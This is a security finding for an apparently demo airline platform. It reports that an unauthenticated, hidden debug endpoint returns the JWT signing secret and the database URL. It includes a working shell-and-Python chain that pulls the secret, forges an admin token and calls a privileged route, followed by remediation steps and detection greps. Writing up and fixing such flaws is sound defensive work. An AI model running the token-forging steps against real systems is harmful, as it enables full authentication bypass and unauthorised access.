# VULN-191 — Debug endpoint dumps the JWT signing secret and database URL

| Field | Value |
|-------|-------|
| ID | VULN-191 |
| Domain | reliability / chaos tooling (`sre`) |
| CWE | CWE-215 (Insertion of Sensitive Information into Debugging Code), CWE-200 (Exposure of Sensitive Information) |
| OWASP Top 10 (2021) | A05:2021 – Security Misconfiguration |
| Severity | Critical |
| Location | `backend/app/routers/sre.py:201-216` (`GET /api/sre/debug/config`) |
| Introduced by | Workstream 8 — reliability core (`devin/iberia-sre`) |

## Description

A diagnostic endpoint added "temporarily" during an incident serialises the whole settings
object, including `settings.jwt_secret` and `settings.database_url`, and returns it to any
caller. It has no authentication dependency and is hidden from the OpenAPI schema
(`include_in_schema=False`), which makes it easy to miss in review while remaining trivially
reachable by anyone who guesses or greps the path.

Leaking the JWT signing secret is a complete authentication bypass: an attacker can mint a
token for any subject with any role (`admin`) and the platform will accept it, because
`decode_access_token` verifies HS256 signatures with exactly this secret.

## Reproduction

```bash
curl -s http://127.0.0.1:8000/api/sre/debug/config
```

Expected insecure result:

```json
{"env":"local","app_name":"Iberia Digital Platform","database_url":"sqlite:///./iberia.db",
 "jwt_secret":"iberia-local-dev-secret","jwt_algorithm":"HS256","jwt_ttl_minutes":720,
 "cors_origins":["http://localhost:5173","http://127.0.0.1:5173"],"log_level":"INFO",
 "chaos_toggles":[]}
```

Escalate to platform admin with the leaked secret:

```bash
SECRET=$(curl -s http://127.0.0.1:8000/api/sre/debug/config | python3 -c 'import json,sys;print(json.load(sys.stdin)["jwt_secret"])')
TOKEN=$(python3 - "$SECRET" <<'PY'
import sys, datetime, jwt
print(jwt.encode({"sub": "admin@iberia.demo", "role": "admin",
                  "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=12)},
                 sys.argv[1], algorithm="HS256"))
PY
)
curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8000/api/sre/chaos
```

## Blast radius

* Full authentication and authorisation bypass across every domain (booking, payments,
  check-in, loyalty, security console) via forged admin tokens — the secret is shared by the
  whole platform and tokens live for 12 hours with no revocation.
* Database location/credentials disclosure enables direct data access where the URL points at a
  networked engine rather than local SQLite.
* CORS origins, log level and active chaos toggles reveal the environment topology and let an
  attacker time an attack to an ongoing incident.

## Intended remediation

Delete the endpoint. If a diagnostics view is genuinely required:

1. Gate it behind `Depends(require_roles("admin"))` **and** an environment check
   (`settings.env == "local"`).
2. Return an allow-list of non-sensitive keys only (`env`, `app_name`, `log_level`), never
   secrets — redact with a helper such as `"***"` for any key matching
   `secret|password|token|url`.
3. Move secrets out of the settings object into a secret manager and load them lazily so they
   cannot be serialised by accident.

## Detection hints

* Grep the routers for settings serialisation: `rg -n 'jwt_secret|database_url' backend/app/routers`.
* Grep for hidden routes: `rg -n 'include_in_schema=False' backend/app`.
* Any route whose path contains `debug`, `diag`, `internal` or `config` and lacks a role
  dependency.
* Runtime: `curl -s http://<host>/api/sre/debug/config | grep -i secret` returns a match.
* Metric `iberia_domain_events_total{domain="sre",event="debug_config_read"}` increments on
  every exploitation attempt.
